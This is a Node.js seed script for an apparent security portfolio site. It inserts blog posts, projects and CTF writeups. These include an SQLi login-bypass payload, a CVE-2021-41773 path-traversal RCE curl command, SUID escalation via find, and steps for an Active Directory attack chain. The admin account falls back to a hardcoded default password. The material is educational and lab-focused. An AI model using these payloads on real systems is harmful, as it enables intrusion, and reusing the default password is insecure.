/**
 * db/seed.js — Populates the database with rich sample content.
 * Run:  node db/seed.js
 * Safe: uses ON CONFLICT DO NOTHING — will not duplicate records.
 */
require('dotenv').config();
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');

const pool = new Pool({
  host: process.env.DB_HOST || 'localhost',
  port: parseInt(process.env.DB_PORT || '5432'),
  database: process.env.DB_NAME || 'portfolio_db',
  user: process.env.DB_USER || 'postgres',
  password: process.env.DB_PASSWORD || '',
});

async function seed() {
  const client = await pool.connect();
  console.log('🌱 Seeding database...\n');
  try {

    // ── Admin ─────────────────────────────────────────────────
    const hash = await bcrypt.hash(process.env.ADMIN_PASSWORD || 'Admin@123', 12);
    await client.query(`
      INSERT INTO admins (name, email, password)
      VALUES ($1, $2, $3)
      ON CONFLICT (email) DO UPDATE SET password = $3
    `, [
      process.env.ADMIN_NAME || 'Fuad Mohammed',
      process.env.ADMIN_EMAIL,
      hash,
    ]);
    console.log('✅ Admin seeded');

    // ── Blog Posts ────────────────────────────────────────────
    const posts = [
      {
        title: 'SQL Injection Explained in Real Banking Systems',
        slug: 'sql-injection-real-banking-systems',
        excerpt: 'How attackers exploit SQLi vulnerabilities in production financial systems — real payloads, detection, and defense strategies.',
        content: `## What is SQL Injection?

SQL Injection (SQLi) remains one of the most critical and widespread vulnerabilities in web applications — consistently ranking in the OWASP Top 10. In financial systems, a single SQLi flaw can expose millions of customer records.

## Classic Attack Example

\`\`\`sql
-- Vulnerable query (string concatenation — NEVER do this)
SELECT * FROM users WHERE username='$input' AND password='$pass';

-- Attacker input: admin' OR '1'='1' --
-- Resulting malicious query:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='x';
\`\`\`

## Why Banks Are High-Value Targets

In real banking systems, SQLi can bypass authentication, extract account numbers and balances, modify transaction records, and in worst cases — execute OS commands via \`xp_cmdshell\` (MSSQL).

## Defense

1. **Parameterized queries** — always use prepared statements
2. **ORM frameworks** — SQLAlchemy, Hibernate handle parameterization
3. **WAF rules** — block common SQLi signatures at network layer
4. **Least privilege** — DB accounts should only have SELECT on what they need
5. **Regular VAPT** — schedule quarterly assessments

\`\`\`python
# Secure FastAPI example using SQLAlchemy ORM
from sqlalchemy import text

async def get_user(db, username: str):
    query = text("SELECT * FROM users WHERE username = :username")
    result = await db.execute(query, {"username": username})
    return result.fetchone()
\`\`\`
`,
        cover_emoji: '💉',
        category: 'cybersecurity',
        tags: ['SQLi', 'OWASP', 'Banking', 'PostgreSQL'],
        read_time_min: 7,
      },
      {
        title: 'TryHackMe Privilege Escalation Walkthrough',
        slug: 'thm-linux-privesc-walkthrough',
        excerpt: 'Full walkthrough of a hard-rated Linux PrivEsc room — from initial foothold to root via SUID binary exploitation.',
        content: `## Room Overview

This walkthrough covers a TryHackMe hard-rated Linux privilege escalation room. We chain three techniques: Apache CVE foothold → shell stabilization → SUID abuse.

## Step 1: Reconnaissance

\`\`\`bash
nmap -sV -sC -p- 10.10.x.x -oN scan.txt
# Open: 22/ssh  80/http  8080/http-proxy

gobuster dir -u http://10.10.x.x \\
  -w /usr/share/wordlists/dirbuster/medium.txt \\
  -x php,txt,bak
\`\`\`

## Step 2: Initial Foothold

Apache 2.4.49 is vulnerable to CVE-2021-41773 — path traversal + RCE:

\`\`\`bash
curl 'http://10.10.x.x/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \\
  --data 'echo Content-Type: text/plain; echo; id'
# uid=www-data(www-data) gid=www-data
\`\`\`

## Step 3: Shell Stabilization

\`\`\`bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo && fg
export TERM=xterm
\`\`\`

## Step 4: SUID Enumeration & Escalation

\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/find  ← vulnerable via GTFOBins

find . -exec /bin/sh \\; -quit
# whoami → root ✓
\`\`\`
`,
        cover_emoji: '🏆',
        category: 'ctf',
        tags: ['TryHackMe', 'PrivEsc', 'Linux', 'SUID', 'CVE-2021-41773'],
        read_time_min: 10,
      },
      {
        title: 'Building Secure APIs with FastAPI',
        slug: 'secure-apis-fastapi',
        excerpt: 'Production patterns for FastAPI backends — OAuth2, JWT, SQL injection prevention, rate limiting, and input validation.',
        content: `## Why FastAPI for Security-Critical Backends?

FastAPI's type system, async architecture, and automatic OpenAPI docs make it ideal for building high-performance, secure backend services.

## OAuth2 + JWT Authentication

\`\`\`python
from fastapi.security import OAuth2PasswordBearer
from jose import JWTError, jwt
from passlib.context import CryptContext

SECRET_KEY = os.environ["JWT_SECRET"]
ALGORITHM  = "HS256"
pwd_ctx    = CryptContext(schemes=["bcrypt"], deprecated="auto")
oauth2     = OAuth2PasswordBearer(tokenUrl="token")

async def get_current_user(token: str = Depends(oauth2), db: AsyncSession = Depends(get_db)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id = payload.get("sub")
        if not user_id:
            raise HTTPException(401, "Invalid token payload")
    except JWTError:
        raise HTTPException(401, "Could not validate credentials")
    user = await db.get(User, user_id)
    if not user:
        raise HTTPException(401, "User not found")
    return user
\`\`\`

## Rate Limiting

\`\`\`python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.post("/login")
@limiter.limit("5/minute")
async def login(request: Request, form: OAuth2PasswordRequestForm = Depends()):
    ...
\`\`\`

## Input Validation with Pydantic

Pydantic models automatically validate and sanitize all incoming data — no manual sanitization needed if you use them correctly.

\`\`\`python
class UserCreate(BaseModel):
    email: EmailStr
    password: str = Field(..., min_length=8, max_length=72)
    name: str     = Field(..., min_length=2, max_length=100, pattern=r"^[a-zA-Z ]+$")
\`\`\`
`,
        cover_emoji: '⚡',
        category: 'webdev',
        tags: ['FastAPI', 'Python', 'Security', 'JWT', 'OAuth2'],
        read_time_min: 8,
      },
      {
        title: 'Common Web Vulnerabilities and Fixes — OWASP Top 10',
        slug: 'owasp-top-10-web-vulnerabilities',
        excerpt: 'OWASP Top 10 practical breakdown with real-world examples of XSS, CSRF, IDOR, and broken authentication with hands-on remediation code.',
        content: `## OWASP Top 10 — Practical Guide (2024)

### 1. Broken Access Control

\`\`\`javascript
// Vulnerable: IDOR — can access any user's data by changing ID
GET /api/users/1234/profile

// Fix: always verify ownership server-side
if (resource.userId !== req.user.id) {
  throw new ForbiddenError('Access denied');
}
\`\`\`

### 2. Cross-Site Scripting (XSS)

\`\`\`javascript
// Vulnerable
element.innerHTML = userInput;

// Secure
element.textContent = userInput;

// For rich content — always sanitize
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
\`\`\`

### 3. Security Misconfiguration

\`\`\`javascript
// Express.js — use Helmet to set 11 security headers at once
const helmet = require('helmet');
app.use(helmet());

app.use(cors({
  origin: ['https://yourdomain.com'],
  methods: ['GET', 'POST'],
  credentials: true,
}));

// Always disable x-powered-by
app.disable('x-powered-by');
\`\`\`

### 4. Cryptographic Failures

\`\`\`javascript
// NEVER store plain passwords or use MD5/SHA1
// Use bcrypt with cost factor ≥ 12
const bcrypt = require('bcryptjs');
const hash = await bcrypt.hash(password, 12);
const valid = await bcrypt.compare(input, hash);
\`\`\`

### 5. Injection (SQL)

Always use parameterized queries — never concatenate user input into SQL strings. See our dedicated SQLi article for full details.
`,
        cover_emoji: '🕷️',
        category: 'tutorial',
        tags: ['OWASP', 'XSS', 'CSRF', 'Security', 'Node.js'],
        read_time_min: 12,
      },
    ];

    for (const p of posts) {
      await client.query(`
        INSERT INTO blog_posts
          (title, slug, excerpt, content, cover_emoji, category, tags, read_time_min, published, published_at)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,true,NOW())
        ON CONFLICT (slug) DO NOTHING
      `, [p.title, p.slug, p.excerpt, p.content, p.cover_emoji, p.category, p.tags, p.read_time_min]);
    }
    console.log(`✅ ${posts.length} blog posts seeded`);

    // ── Projects ──────────────────────────────────────────────
    const projects = [
      {
        title: 'Secure Task Management System', type: 'dev',
        description: 'Enterprise-grade task management with JWT auth, RBAC, and audit logging built for team productivity with security at its core.',
        tech_stack: ['React', 'Node.js', 'MongoDB', 'JWT', 'Express', 'Tailwind CSS'],
        security_notes: 'JWT + RBAC with role-based access control, bcrypt hashing, rate limiting on all auth endpoints, audit trail logging',
        github_url: 'https://github.com/fuadmohammed', featured: true, sort_order: 1,
      },
      {
        title: 'E-Commerce Platform', type: 'dev',
        description: 'Full-featured e-commerce application with payment API integration, cart system, product management, and admin dashboard.',
        tech_stack: ['MERN Stack', 'Redux', 'Stripe API', 'Tailwind CSS'],
        security_notes: 'CSRF protection, input sanitization, secure payment pipeline with PCI compliance, HTTPS enforcement',
        github_url: 'https://github.com/fuadmohammed', featured: true, sort_order: 2,
      },
      {
        title: 'FastAPI Secure Backend Service', type: 'dev',
        description: 'High-performance RESTful API with FastAPI, PostgreSQL, OAuth2, and comprehensive security middleware for banking-grade deployments.',
        tech_stack: ['FastAPI', 'PostgreSQL', 'SQLAlchemy', 'OAuth2', 'Docker'],
        security_notes: 'OAuth2 + JWT, SQL injection prevention via ORM, slowapi rate limiting, Pydantic input validation',
        github_url: 'https://github.com/fuadmohammed', featured: true, sort_order: 3,
      },
      {
        title: 'VAPT Report: Web Application Security Testing', type: 'sec',
        description: 'Comprehensive vulnerability assessment and penetration testing of a financial web application. Identified 12 critical CVEs with full PoC and remediation guidance.',
        tech_stack: ['Burp Suite', 'Nmap', 'OWASP ZAP', 'Python', 'Metasploit'],
        security_notes: '12 CVEs discovered • SQLi, XSS, IDOR, Broken Auth, SSRF • Full PoC + remediation for each finding',
        github_url: 'https://github.com/fuadmohammed', featured: true, sort_order: 4,
      },
      {
        title: 'TryHackMe / CTF Writeups Collection', type: 'sec',
        description: 'Documented walkthroughs of 50+ TryHackMe rooms and CTF challenges covering web exploitation, privilege escalation, forensics, and network analysis.',
        tech_stack: ['Python', 'Bash', 'Nmap', 'Gobuster', 'Hashcat'],
        security_notes: 'Top 5% global ranking • 50+ rooms • Web, PrivEsc, Forensics, Active Directory attack chains',
        github_url: 'https://github.com/fuadmohammed', featured: true, sort_order: 5,
      },
      {
        title: 'Vulnerability Scanning Automation Tool', type: 'sec',
        description: 'Python automation framework orchestrating Nmap, Gobuster, and custom scripts to generate structured vulnerability reports for pentesting engagements.',
        tech_stack: ['Python', 'Nmap', 'Gobuster', 'Bash', 'Jinja2'],
        security_notes: 'Automated recon → enumeration → HTML/JSON report pipeline. Reduces manual scanning time by 70%',
        github_url: 'https://github.com/fuadmohammed', featured: true, sort_order: 6,
      },
    ];
    for (const p of projects) {
      await client.query(`
        INSERT INTO projects (title,type,description,tech_stack,security_notes,github_url,featured,sort_order)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8)
        ON CONFLICT DO NOTHING
      `, [p.title, p.type, p.description, p.tech_stack, p.security_notes, p.github_url, p.featured, p.sort_order]);
    }
    console.log(`✅ ${projects.length} projects seeded`);

    // ── Security Writeups ─────────────────────────────────────
    const writeups = [
      {
        title: 'SQL Injection — Banking Login Bypass',
        platform: 'tryhackme', difficulty: 'medium',
        summary: 'Classic blind SQLi on a login endpoint leading to full account takeover via boolean-based extraction.',
        content: '## Overview\n\nBoolean-based blind SQL injection on a financial login page...',
        tags: ['Web', 'SQLi', 'Authentication'],
        steps: [
          'Identified login form with no prepared statements via Burp intercept',
          "Payload: admin' OR '1'='1' -- confirmed injectable field",
          'Boolean-based blind extraction — enumerated database schema',
          'Dumped credential table and cracked MD5 hashes offline',
          'Escalated to admin panel via extracted admin hash',
        ],
        tools_used: ['Burp Suite', 'SQLMap', 'Hashcat'],
      },
      {
        title: 'Linux Privilege Escalation — SUID Abuse',
        platform: 'tryhackme', difficulty: 'hard',
        summary: 'Chained vulnerability from CVE-2021-41773 exploitation to SUID binary abuse achieving root on a hardened Ubuntu server.',
        content: '## Overview\n\nChained Apache CVE to SUID binary abuse for root...',
        tags: ['PrivEsc', 'Linux', 'SUID'],
        steps: [
          'Initial foothold via CVE-2021-41773 path traversal RCE',
          'Stabilized shell with python3 pty + stty raw -echo',
          'LinPEAS enumeration — found SUID on /usr/bin/find',
          'GTFOBins exploit: find . -exec /bin/sh \\; -quit',
          'Root achieved — flag captured from /root/root.txt',
        ],
        tools_used: ['Nmap', 'LinPEAS', 'GTFOBins', 'Netcat'],
      },
      {
        title: 'Network Forensics — PCAP Analysis',
        platform: 'tryhackme', difficulty: 'medium',
        summary: 'Analyzed a suspicious .pcap file from an assumed-compromised host to reconstruct an attacker lateral movement path.',
        content: '## Overview\n\nDNS tunneling data exfiltration reconstruction via PCAP...',
        tags: ['Forensics', 'Network', 'DNS'],
        steps: [
          'Opened capture in Wireshark, applied http.request.method == POST filter',
          'Identified data exfiltration over DNS tunneling',
          'Decoded base64 payloads in DNS TXT records',
          'Reconstructed attacker C2 communication timeline',
          'Identified compromised credentials sent in cleartext over HTTP',
        ],
        tools_used: ['Wireshark', 'tshark', 'CyberChef'],
      },
      {
        title: 'HackTheBox — Active Directory Takeover',
        platform: 'hackthebox', difficulty: 'insane',
        summary: 'Full domain compromise via Kerberoasting, Pass-the-Hash, and DCSync attack chain on an enterprise-grade AD lab.',
        content: '## Overview\n\nFull AD takeover chain — Kerberoast → PTH → DCSync...',
        tags: ['Active Directory', 'Kerberoasting', 'DCSync', 'Windows'],
        steps: [
          'Initial SMB enumeration — identified guest credentials',
          'Kerberoasting with Impacket GetUserSPNs.py to extract TGS tickets',
          'Offline crack with Hashcat (--attack-mode 0) → service account password',
          'Pass-the-Hash lateral movement to Domain Controller via WMI',
          'DCSync attack — extracted NTDS.dit and KRBTGT hash for Golden Ticket',
        ],
        tools_used: ['Impacket', 'Hashcat', 'BloodHound', 'CrackMapExec', 'Evil-WinRM'],
      },
    ];
    for (const w of writeups) {
      await client.query(`
        INSERT INTO writeups (title,platform,difficulty,summary,content,tags,steps,tools_used,published)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,true)
        ON CONFLICT DO NOTHING
      `, [w.title, w.platform, w.difficulty, w.summary, w.content, w.tags, w.steps, w.tools_used]);
    }
    console.log(`✅ ${writeups.length} writeups seeded`);

    console.log('\n🎉 All seed data loaded successfully!\n');
  } finally {
    client.release();
    await pool.end();
  }
}

seed().catch(err => {
  console.error('❌ Seed failed:', err.message);
  process.exit(1);
});
